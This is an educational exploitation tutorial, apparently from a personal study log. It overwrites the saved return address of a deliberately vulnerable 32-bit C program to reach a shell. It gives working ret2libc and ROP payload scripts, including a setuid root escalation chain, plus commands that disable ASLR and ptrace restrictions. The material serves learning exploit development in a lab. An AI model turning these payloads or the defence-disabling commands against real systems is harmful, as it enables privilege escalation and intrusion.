# Overwriting the RIP/EIP

dependencies:
	[Buffer Overflow](../buffer_overflow/buffer_overflow.md) \
	[Layout](../../elf/layout.md) \
	[Compilation](../../elf/compilation.md) \
	[GDB](../gdb/gdb.md)

sources:
https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 \
https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux \
https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization \
https://en.wikipedia.org/wiki/Address_space_layout_randomization \
https://www.ret2rop.com/2018/08/return-to-libc.html \
https://github.com/JonathanSalwan/ROPgadget \
https://stackoverflow.com/questions/14370972/how-to-attach-a-process-in-gdb \
http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf

When a function is called, a return address is saved in the stack so the
program knows where to take instructions from after the function exits, by
loading this address to the Instruction Pointer.

With `first_buffer_overflow.c` we learned how to overwrite a variable below
the buffer to get access to a part of the program, but if we can overwrite
the RIP (or EIP) we will be able to go to any part of the program
after a function is called.

Overwriting the RIP to redirect the execution flow of the program is the
key concept in Return-Oriented Programming (ROP).

Our "victim" will be the program at `rip.c`:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void impossible_shell(){

	system("/bin/sh");
}

int password_is_correct(char* passwd){

	char buffer[16];
	strcpy(buffer, passwd);

	return !strncmp(buffer, "passwd1", 16);
}

int main(int argc, char* argv[]){

	if( password_is_correct(argv[1]) ){

		printf("PASSWORD IS CORRECT!\n");
		printf("i don't feel like giving you a shell thoughüòù\n");

	} else {

		printf("PASSWORD IS INCORRECT!\n");
		printf("try harder next time\n");
	}
}

```

It is important to note some stuff about the program:

* The function *impossible_shell* is **never** called by the program.
We are going to call it anyway :wink:

* The input is given directly from the command line. If scanf was used
the only difference is that we would use some command line trick to
redirect the desired input to the program. The concepts used for the actual
ROP wouldn't change.

## The Compilation Throughout the ROP material

Just like in `first_buffer_overflow.c`, we will compile with some flags
to allow us to exploit the program easily. We will introduce some new
flags and gradually compile without some of them as we understand how
to bypass the defenses they disable.

## Easiest Cenario

### The Compilation

We will compile using ASLR disabled (explained below)
`gcc rip.c -m32 -no-pie -fno-stack-protector -o rip`:

* `-m32` - compile to 32 bits. The code will still run on 64 bit
architectures. If your compilation throws an error, try installing the
`libc6-dev-i386` package in Linux. 32 bit addresses are smaller and
usually don't contain null bytes, which we can't write to an string.

* `-no-pie` - force to produce position-dependent code. When the code
is position-independent the OS usually puts it in a random location in
memory. We will first execute the program to discover relevant
addresses and then execute again to use them, and without this flag
the addresses would be different between executions. Without ASLR, the
heap and libraries could still have random addresses.

* `-fno-stack-protector` - disables canary. Canary is a defense technique
against buffer overflow that basically puts a random value in the stack
and check if it changes at some point. If it does is because a buffer
overflow overwrote it and the program is terminated.

* `-o` - what comes after this flag will be the name of our executable.

* Disable ASLR - ASLR stands for Address Space Layout Randomization,
and it is responsible for randomly arranging the address space
for the stack, heap and libraries. Without `-no-pie` everything would
be mapped to the same place, but the binary itself would store offsets
instead of addresses, which would become addresses when the program is
called. To disable ASLR:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Or using the `Makefile`:

```
make disable_aslr
```

The ASLR is automatically restore on reboot, but you can also do it
manually:

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Or with `make`:

```
make enable_aslr
```

Or you can just use the `Makefile`'s  `first` rule with `make first`,
that will take care of everything.

### Plan of Attack

As stated before, ROP is all about redirecting the flow of execution
by overwriting the return address in the stack. All we need to make
it happen is the address to `impossible_shell` and how far our
buffer is from the return address.

Mind that we are not going to overwrite the return address from `main`,
since the buffer is actually in the `password_is_correct` stack frame.

### Getting Our First Shell With ROP

First, launch gdb with `gdb -q rip`. We will use the `info functions`
command in `gdb` to search for `impossible_shell`.

```
info functions impossible_shell
```

Obs .: `info functions` does the search using regex. Just writing
`impossible` would do the job!

You should have an output like this one (the address is probably
different though):

```
All functions matching regular expression "impossible":

Non-debugging symbols:
0x0804849b  impossible_shell
```

We now only need the distance from the buffer to the return address.
To get it, all we really need is to run
`disassemble password_is_correct` to peek under the hood.

We know that our buffer is used as argument for `strcpy` and
`strncmp`,  so we just need to check what address (from the stack)
pushed to the stack before these functions are called.

Indeed, just before `strcpy` is called we have:

```
0x0804852c <+21>:	push   DWORD PTR [ebp+0x8]
0x0804852f <+24>:	lea    eax,[ebp-0x18]
0x08048532 <+27>:	push   eax
```

And just before calling `strncmp`:

```
0x08048540 <+41>:	lea    eax,[ebx-0x1971]
0x08048546 <+47>:	push   eax
0x08048547 <+48>:	lea    eax,[ebp-0x18]
0x0804854a <+51>:	push   eax

```

Obs .: In this case, all the information we just gathered using
`gdb` could be fetched using `objdump -d -M intel-mnemonic rip`.

In both snippets, the common address is **ebp-0x18**. Which means
that after the 18th byte our buffer start writing EBP
(which has 4 bytes) and then our target: EIP (also 4 bytes).

All that is left to do now is write the payload and give it
as the input to the program:

```
./rip `python -c "print(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```
Or, using python3:
```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x9b\x84\x04\x08')"`
```

Here we have 24 (0x18) bytes to fill the space between the EBP
and the start of the buffer, after that we have `'BBBB'` to fill
the EBP, and finally we have the value that will be the new
Return Address.

Obs.: My machine uses little-endian, that's why the address byte
order is backwards. Yours is probably too (most are nowadays)

Running any of the above commands (with the proper addresses)
should grant you a shell!

### Getting Shells in the Wild

Although we managed to get the shell, our methodology could be improved
to work in other scenarios.

1. What if `impossible_shell` was a more complex function?

2. What if `system` called "/bin/cal" instead?

3. What if `system` wasn't called at all?

The answer: Return to `libc`.

`libc`, the C standard library is the one used for functions like
`printf`, `scanf`, `system` and many more.

Why this help us? When a library is loaded, it is *entirely* loaded.
This means that even if a program uses only `printf`, the entire
libc is accessed by the program.

If we can get a shell using only libc, this means we can get a
shell in most C programs with a buffer overflow vulnerability.

So, this is how we are going to answer:

1. Doesn't matter, let's just call `system` directly from `libc`!

2. There is a "/bin/sh" string in `libc`, let's just use it
instead!

3. Doesn't matter either! We can also call `system` from `libc`!

Of course, although our current setup makes this easier, we will
see how far we can go with the barriers we disabled afterwards.

To get the addresses from `libc` we need to run the program in
`gdb` and break at some point.

```
(gdb) break main
Breakpoint 1 at 0x804851e
(gdb) run 
Breakpoint 1, 0x0804851e in main ()
(gdb)
```

Now `libc` is loaded and we can get relevant info from it. To
get the `system` address type:

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e36850 <system>
```

And type that value where the `impossible_shell` address was before:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7')"`
sh: 1: ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ: not found
Segmentation fault
```

Well, that didn't work! We forgot to pass an argument to `system`.
Previously, `impossible_shell` pushed the address of "/bin/sh",
but now we are the ones doing the heavy-lifting.

Let's take a look at our current payload:

```
b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + 'garbage value1' + 'garbage value2'
```

`b'A'*0x18` is just so we can fill the stack and overwrite the actual
important stuff, just like `b'BBBB'`. When `password_is_correct` ends its
execution, `b'\x50\x68\xe3\xf7'` get written to EIP, ESP points to
'garbage value1' and `impossible_shell` is called. In `impossible_shell`,
EBP is pushed to stack. Are you following? At this point we are in the
`impossible_shell` and the stack looks like this:

Higher Addresses (Bottom of the stack) |
---------------------------------------|
garbage value2 (argument) |
garbage value1 (return address) |
saved EBP (pushed `impossible_shell`) |
Lower Addresses (Top of the stack) |

As you can see, if we write the address of "/bin/sh" to 'garbage value2'
it will be used as an argument to `system`. To find the address of
"/bin/sh", we can use the command `info proc map` in `gdb` (in a break)
to get the location in memory where `libc` was loadded to:

```
(gdb) info proc map
process 6820
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
	 0x8049000  0x804a000     0x1000        0x0 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
	 0x804a000  0x804b000     0x1000     0x1000 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
	0xf7df8000 0xf7df9000     0x1000        0x0 
	0xf7df9000 0xf7fa9000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fa9000 0xf7fab000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fab000 0xf7fac000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fac000 0xf7faf000     0x3000        0x0 
	0xf7fd3000 0xf7fd4000     0x1000        0x0 
	0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

```

We can now use the command `find` to search for the string between
the first and last addresses:

```
(gdb) find 0xf7df8000, 0xf7fac000, "/bin/sh"
0xf7f54a0b
1 pattern found.
```

And finally add the address to our payload:

```
./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'CCCC' + b'\xc8\x97\xf5\xf7')"`
```

### NULL bytes, Gadgets and Chains

In my machine, the last procedure was really straight forward, but
what if one of these addresses contained a **null byte** (0x00)?

Since we are giving our input as a string, a null byte would
mark the end of the string and thus making the rest of our
input to be ignored.

For example, in my machine, the address of the function `exit`
in `libc` is `0xf7e2a800`, and in an attempt to make our shell
exit smoothly (which is a good practice, to avoid catching the
attention of a sysadmin monitoring crashing programs for example),
i tried the following:

```
b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'\x00\xa8\xe2\xf7' + b'\xc8\x97\xf5\xf7'
```

But we get a `Segmentation Fault` for that, since after the null
byte (`\x00`) the input is no longer processed, and without the
address of "/bin/sh" (\xc8\x97\xf5\xf7) we can't get a shell.

So how do we write a null byte when we can't put it in our input?
Make something else write it for us! To do so we can use `gets`
command!

`gets` write reads a line from our input into a buffer (address we
give to it) until either a terminating newline or EOF, which it
replaces with a null byte ('\0'). If we call `gets` and input
nothing, a null byte will be written to the address we give it.

Obs .: Before doing so, i recommend writing the exploit in a file,
since things can get complicated really easily when writing payloads
directly to the terminal. 

Since we want to call `gets` and then `system` we are building a
**ROP chain**. Chains are calls to different functions, connected
together by **gadgets**. gadgets are small pieces of code that end
with the `ret` command, that allow us to redirect the excution flow
again and again by giving addresses to the many `ret` commands
that glue our exploit together. gadgets usually have `pop` commands
to help us manipulate the stack.

You could just look around for gadgets that might be interesting
to use (`objdump` and `grep -B` are pretty helpful), or you could
let a tool like ROPgadget find them for you.

To recap, our exploit should:

1. Call `gets` and write \x00 to a byte address we will pass as
an argument

2. Call `system` with "/bin/sh" as argument

3. Call exit, leaving the program with no `Segmentation Fault`

first, the `gets`:

```
#fill buffer, EBP, go to gets, return address, address to write null
b'A'*0x18 + b'BBBB' + gets +  return address  + address to nullify
```

In `return address` we could put a `pop; ret` gadget. This would
get rid of `address to nullify` and load whatever comes after it to
EIP.

We have two binaries in which we can look for gadgets here: `rip`
and the 32 bit `libc` library.

With `objdump -D -M intel-mnemonic rip | grep -B 1 ret | grep -A 1 pop`
we get theses results:

```
 804832d:	5b                   	pop    ebx
 804832e:	c3                   	ret    
--
 80485fb:	5d                   	pop    ebp
 80485fc:	c3                   	ret    
--
 8048616:	5b                   	pop    ebx
 8048617:	c3                   	ret
```

Since we keep overriding EBP anyway, let's just use
`0x80485fb` (`pop ebp; ret`). So the beggining of our
payload now looks like this:

```
b'A'*0x18 + b'BBBB' + gets + pop;ret + address to nullify
```

Now for the `system` part we just add:

```
system + exit (with a non zero value instead of the null byte) + "/bin/sh" address
```

To get `exit` we can just do `print exit` in `gdb` after
running the program. To get where the future null byte of
`exit` will be at, we just get the number of bytes
between it and the first EBP byte (20 bytes) and add it
to the value of EBP at `passsword_is_correct`:

```
(gdb) p $ebp
$9 = (void *) 0xffffd208
(gdb) p $ebp + 20
$10 = (void *) 0xffffd21c
```

resulting in:

```
b'A'*0x18 + b'BBBB' + gets + pop;ret + address to nullify + system + exit (with a non zero value instead of the null byte) + "/bin/sh" address
```

And changing everything to the actual addresses:

```
#fill buffer,  EBP,         gets         ,         pop;ret ,     address to nullify,        system,      exit (with \xBB instead of \x00),     "bin/sh"
b'A'*0x18 + b'BBBB' + b'\xc0\xaf\xe5\xf7' + b'\xfb\x85\x04\x08' + b'\x2c\xd2\xff\xff' + b'\x50\x68\xe3\xf7' + b'\xBB\xa8\xe2\xf7' + b'\xc8\x97\xf5\xf7'
```

Or, in a python3 script (first.py):

```
import sys
import struct

payload = b'A' * 0x18
payload += b'BBBB'
payload += struct.pack("I", 0xf7e5afc0) # gets
payload += struct.pack("I", 0x080485fb) # pop ebp;ret
payload += struct.pack("I", 0xffffd218 + 20) # address to nullify
payload += struct.pack("I", 0xf7e36850) # system
payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh

sys.stdout.buffer.write(payload)

```

Run it by using `./rip $( python3 first.py )`.

In `gdb`, this payload gives me a gracefull shutdown when i
exit the shell. However, when running it normally, i get
a `Segmentation Fault` on exit.

Although we can manipulate some settings to make the `gdb`
and the actual environment we will exploit similar, it is
not always enough. A solution to this is to investigate
in the environment we will exploit by attaching `gdb` to
it.

First, run `sudo sysctl -w kernel.yama.ptrace_scope=0`,
this will allow us to attach `gdb` to an already running
processes.

If you run `./rip $( python3 first.py )` and don't
type anything, you can go to another window and type
`gdb rip` and press `TAB`. This will autocomplete the
command by inserting the PID number of `rip`, allowing
you to start `gdb` attach to the already running process!

If we follow the program's execution until the `ret` that
loads `exit` address to EIP, we can see that (before `ret` is
actually executed) with `x/10x $esp` that the address of exit,
`0xf7e2a8BB`, is at `0xffffd27c`.

Since in little-debian the first byte of this address is
the first to appear in memory, `0xffffd27c` is the address
of the `0xbb` byte we want to nullify.

By changing the address to nullify in `first.py` from
`0xffffd218` to `0xffffd27c`, we get the shell and a
gracefull exit:

```
./rip $( python3 first.py )

$ exit
```

### Getting r00t

Although we got some shells already, so the next step would be getting a
root shell. If the binary we are attacking has the `setuid` bit set
(you can check it with `ls -l`), this means we can execute it as its
owner. If we owner is root, guess what? we can execute the program as root,
with all the privileges.

To change the `setuid` bit in the `rip` file and give its ownership to
root:

```
sudo chown root rip
sudo chmod u+s rip
```

If you run our exploit now, you may get a shell as root (you can check it
by runnning `whoami`), but that is not always the case, since `system`
is basically calling `/bin/sh -c <our argument>` and in some systems
"/bin/sh" is just a symbolic link to "/bin/bash", which usually drop
privileges.

A workaround for this issue is to call `setuid`. This function changes
what `uid` the user running the program has. The `root` user uid is
`0`. So we will have to call `gets` four more times to write a entire
`int` (4 bytes) to be used as argument.

Find `setuid` address in gdb with (remember, you need to use a
breakpoint):

```
(gdb) p setuid
$1 = {<text variable, no debug info>} 0xf7eadd60 <setuid>
```

Since we will change where the address of `exit` is in our
payload, the address given to the first `gets` will also change.
In the end our payload will look like so:

```
b'A'*-x18 + b'BBBB' + gets + pop ebp; ret + address from exit to nullify + 4 * (gets + pop ebp;ret + address to nullify) + setuid + pop ebp; ret + 4 0x00 bytes + system + exit + address of "/bin/sh"
```

Right after `exit` is where we will point our `gets`. Right now
our payload is really big, so ypu should start using a python3
script to run it, if you haven't already.

Mine ended looking like this:

```
import sys
import struct

pop_ret =  struct.pack("I", 0x080485fb)
gets = struct.pack("I", 0xf7e5afc0)

payload = b'A' * 0x18
payload += b'BBBB'
payload += gets
payload += pop_ret
payload += struct.pack("I", 0xffffd288) # address from exit to nullify

for i in range(4):
    payload += gets
    payload += pop_ret
    payload += struct.pack("I", 0xffffd280 + i) # address of byte to nullify

payload += struct.pack("I", 0xf7eadd60) # setuid
payload += pop_ret
payload += b'CCCC' # will be nullified afterwards
payload += struct.pack("I", 0xf7e36850) # system
payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh

sys.stdout.buffer.write(payload)
```

If `setuid` doesn't work, you may have to execute another program (that
you code yourself) that gives you a shell, as root.

You can call a command like `execlp` or `execve` from libc to
execute a simple python3 script like this:

```
__import__('os').system('/bin/sh -c')
```
